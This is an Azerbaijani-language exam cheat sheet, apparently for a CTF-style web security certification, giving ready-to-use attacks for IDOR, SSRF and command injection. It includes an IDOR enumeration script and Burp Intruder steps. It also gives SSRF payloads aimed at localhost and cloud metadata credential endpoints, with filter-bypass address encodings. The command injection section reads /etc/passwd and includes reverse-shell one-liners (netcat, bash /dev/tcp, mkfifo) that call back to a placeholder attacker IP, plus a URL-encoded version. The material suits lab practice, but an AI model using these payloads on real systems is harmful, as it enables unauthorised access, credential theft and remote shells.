Web tətbiqləri bölməsində qarşına çıxa biləcək 3 əsas boşluq üçün (**IDOR, SSRF və Command Injection**) imtahan zamanı sənə ən çox vaxt qazandıracaq, nöqtəatışı tətbiq edə biləcəyin tam praktiki metodologiya və hazır kodlar bunlardır:
## 1. IDOR (Insecure Direct Object Reference)
İmtahanda IDOR sualları adətən relyasiyalı rəqəmlər (məsələn: 1001, 1002) və ya şifrələnmiş formatlar üzərindən gəlir.
### A. Avtomatlaşdırılmış Python Skripti (Sürətli Skan)
Əgər cookie və ya header tələb edən bir paneldirsə və 100-lərlə ID-ni əllə yoxlamaq vaxt aparacaqsa, bu skripti terminalda sürətlə yaradıb işlət:
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# İmtahan URL-ni bura yaz
url = "http://target.ctf/api/v1/documents/" 
# İmtahandakı mövcud sessiya məlumatlarını bura daxil et
headers = {
    "Authorization": "Bearer eyJhbGciOi...",
    "Cookie": "session=abc123xyz..."
}

# 1000-dən 1100-ə qədər olan ID-ləri yoxlayırıq
for user_id in range(1000, 1100):
    target_url = f"{url}{user_id}"
    response = requests.get(target_url, headers=headers, verify=False)
    
    # Əgər səhifə boş deyilsə və xəta kodu (401/403/404) vermirsə
    if response.status_code == 200 and "Access Denied" not in response.text:
        print(f"[+] IDOR Tapıldı! ID: {user_id} | Response Length: {len(response.text)}")
        # Əgər flag-ı ekrana yazdırmaq istəyirsənsə:
        if "flag" in response.text.lower():
            print(f"[!!!] FLAG TAPILDI: {response.text}")

```
### B. Burp Suite Intruder Metodu (Kodsuz variant)
 1. Sorğunu **Burp Suite** ilə tut (Intercept) və **Intruder**-ə göndər (Ctrl + I).
 2. Dəyişmək istədiyin ID parametrini seç və işarələ: id=§1001§.
 3. **Payloads** bölməsində növü **Numbers** olaraq təyin et. From: 1, To: 2000, Step: 1 seçib hücumu başlat.
 4. **Length** (Cavabın ölçüsü) sütununa görə sırala. Digərlərindən fərqli ölçüdə olan cavab sənin axtardığın digər istifadəçinin məlumatıdır.
## 2. SSRF (Server-Side Request Forgery)
Məqsəd tətbiqin serverindən istifadə edərək daxili infrastruktura (localhost, 127.0.0.1 və ya daxili İP-lər) sorğu göndərmək və qapalı portları süzgəcləməkdir.
### A. Sürətli Port və İnfrastruktur Skan Payloadları
Veb interfeysdəki URL daxiletmə sahəsinə və ya Burp-dakı parametrlərə (?url=, ?path=, ?file=) ardıcıllıqla bunları yoxla:
```text
# Localhost və daxili xidmətlərin yoxlanılması
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:22
http://127.0.0.1:6379   (Redis - əgər aktivdirsə RCE-yə gedə bilər)

# Bulud mühiti Metadata (Əgər sistem AWS/DigitalOcean-dadırsa flag buradadır)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

```
### B. WAF / Filter Yan Keçmə (Bypass) Payloadları
Əgər 127.0.0.1 və ya localhost sözləri bloklanıbsa, filteri keçmək üçün bu ekvivalentləri yaz:
```text
# İP manipulyasiyası
http://0.0.0.0:80
http://127.1:80
http://2130706433/      (127.0.0.1-in Decimal versiyası)
http://0177.0.0.1/      (Octal versiyası)

# CIDR Bypass (Əgər 127.0.0.1 blokdursa, local diapazondan başqa İP yoxla)
http://127.0.0.2
http://127.127.127.127

# Göstərici domenlərdən istifadə
http://spoofed.burpcollaborator.net
http://localtest.me

```
## 3. Command Injection (Əmr İcrası)
Giriş sahələrinə göndərilən datanın ardına sistem əmrləri yeritmək üçün istifadə olunur.
### A. Filter Olmadıqda Birbaşa Payloadlar
Hədəf tətbiqin arxa fonda Linux və ya Windows işlətdiyinə əmin olmaq və flag oxumaq üçün:
```bash
# Linux üçün (Əmrləri ayırmaq üçün ;, &&, |, %0a istifadə et)
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 %0a cat /home/user/flag.txt

# Windows üçün
127.0.0.1 & whoami
127.0.0.1 && type C:\Flags\flag.txt

```
### B. Boşluq (Space) Filterini Yan Keçmə (Bypass)
Əgər sistemdə boşluq simvolu ( ) bloklanıbsa və əmrin davamını yaza bilmirsənsə:
```bash
# Linux boşluq bypass metodları
127.0.0.1;whoami
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;cat</etc/passwd
127.0.0.1;echo$IFS"hello"

# Windows boşluq bypass metodu (Proses daxili dəyişənlər)
127.0.0.1&type%ProgramFiles:~10,1%C:\flag.txt

```
### C. Reverse Shell Alınması (Tam İnteraktiv Qoşulma)
İmtahanda sənə terminal lazım olduqda, öz Kali maşınında nc -lvnp 9001 başladaraq web hissəyə bu payloadlardan birini daxil et (**Qeyd:** Payloadları göndərməzdən əvvəl mütləq Burp Suite-də Ctrl + U edərək URL-encode et):
```bash
# Standart Netcat (Əgər hədəfdə -e parametri aktivdirsə)
127.0.0.1; nc <KALI_IP> 9001 -e /bin/bash

# Alternativ Bash Reverse Shell (Ən stabil işləyən)
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/9001 0>&1'

# Named Pipe (MKFIFO) metodu (Əgər standart nc işləmirsə)
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 9001 >/tmp/f

```




---------





 **IDOR, SSRF və Command Injection** tapşırıqlarını tamamilə əllə (**Manual**) və ya yalnız brauzer/Burp Suite daxili funksiyaları ilə həll etməlisən.
Bunun üçün tam manual və qaydalara uyğun metodologiya:
## 1. IDOR (Manual & Burp Intruder)
Skript olmadan çoxlu sayda ID-ni yoxlamaq üçün **Burp Suite Intruder**-dən istifadə edilir. Bu, avtomatlaşdırılmış kənar skript (custom script) sayılmır, standart proxy funksionallığıdır.
### Addım-addım Tətbiqi:
 1. Səhifədə öz profilinizə və ya sənədinizə klikləyin. Sorğunu Burp-da tutub **Intruder**-ə göndərin (Ctrl + I).
 2. **Positions** bölməsinə gəlin. Dəyişmək istədiyiniz ID rəqəmini seçib **Add §** düyməsinə sıxın:
   GET /api/documents/?id=§1001§ HTTP/1.1
 3. **Payloads** bölməsinə keçin:
   * **Payload type:** Numbers seçin.
   * **From / To / Step:** 1000 / 1050 / 1 olaraq təyin edin.
   * **Min integer digits:** 1
 4. Yuxarı sağ küncdəki **Start Attack** düyməsinə sıxın.
 5. **Nəticənin Analizi (Kritik addım):** Gələn cavabları **Length** (Ölçü) və **Status** sütununa görə sıralayın. Sizin icazəniz olmayan ID-lər adətən 401 Unauthorized və ya eyni ölçülü xəta mətni qaytarır. IDOR olan sətirdə isə ölçü fərqli olacaq və 200 OK verəcək. Həmin sətrin üzərinə klikləyib **Response -> Render** və ya **Raw** hissəsindən flag-ı oxuyun.
## 2. SSRF (Manual Fuzzing & Port Skan)
Daxili infrastrukturu skriptsiz yoxlamaq üçün yenə Burp Intruder-dən və ya birbaşa URL sətirindən istifadə edəcəyik.
### A. URL Parametrlərinin Əllə Manipulyasiyası
Əgər tətbiq kənar resursu ekrana gətirirsə (məsələn: ?image=http://example.com/pic.jpg), daxili İP-ləri brauzerdə növbə ilə daxil edin:
```text
# 1. Addım: Localhost yoxlanışı (Daxili admin paneli açılırmı?)
http://localhost/admin
http://127.0.0.1/flag

# 2. Addım: WAF (Filter) varsa, brauzerdə bunları yoxla:
http://0.0.0.0/
http://127.1/
http://localhost:80/

# 3. Addım: Cloud infrastrukturdursa, Metadata URL-ni birbaşa yapışdır:
http://169.254.169.254/latest/meta-data/

```
### B. Daxili Portların Burp Intruder ilə Tapılması
Server daxilində hansı portların (məs. 80, 8080, 3306, 6379) açıq olduğunu tapmaq üçün:
 1. Sorğunu tutun: POST /submit?url=http://127.0.0.1:§80§
 2. Intruder-də port hissəsini işarələyin.
 3. **Payloads** tipini Numbers seçib 1-dən 10000-ə qədər (və ya ən populyar portları: 22, 80, 443, 3306, 6379, 8080, 8443) siyahı (Simple List) halında yazıb hücumu başladın.
 4. Cavab müddəti (Response time) çox qısa olan və ya fərqli status kodu verən portlar daxildə aktiv işləyən xidmətlərdir.
## 3. Command Injection (Tam Manual Payloadlar)
Heç bir alət istifadə etmədən, birbaşa saytın daxiletmə (input) sahəsinə əmrlər yazılır. İmtahanda əsas məsələ **WAF filterlərini əllə keçməkdir**.
### A. Brauzer Üzərindən Birbaşa Sınaq (Giriş Sahəsinə)
Saytda input yerinə (məsələn, IP daxil edilən sahəyə) ardıcıllıqla bunları yazın:
```bash
# Ssenari 1: Tam sərbəst əmr icrası
8.8.8.8 ; whoami
8.8.8.8 && id
8.8.8.8 | cat /etc/passwd

# Ssenari 2: Əgər boşluq (space) qadağandırsa (Boşluqsuz yazılış)
8.8.8.8;whoami
8.8.8.8;cat</etc/passwd
8.8.8.8;cat$IFS/home/user/flag.txt

```
### B. Burp Suite vasitəsilə Manual Reverse Shell göndərilməsi
Əgər əmrin işlədiyini gördünüzsə (məsələn ; sleep 5 yazdıqda səhifə 5 saniyə gec yüklənirsə, deməli Blind Command Injection var), özünüzə bağlantı çəkmək üçün:
 1. Öz Kali terminalınızda dinləyici başladın: nc -lvnp 4444
 2. Aşağıdakı payload-u Burp Suite-də daxil edin:
   ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SİZİN_KALI_IP> 4444 >/tmp/f
 3. **Kritik Qayda:** Bu əmri Burp-da göndərməzdən əvvəl seçib mütləq **Ctrl + U** (URL Encode) edin. Əks halda & və ya boşluq simvolları sorğunu korlayacaq və əmr icra olunmayacaq. Encoded variant belə görünməlidir:
   %3b+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f%7c/bin/sh+-i+2%3e%261%7cnc+<KALI_IP>+4444+%3e/tmp/f
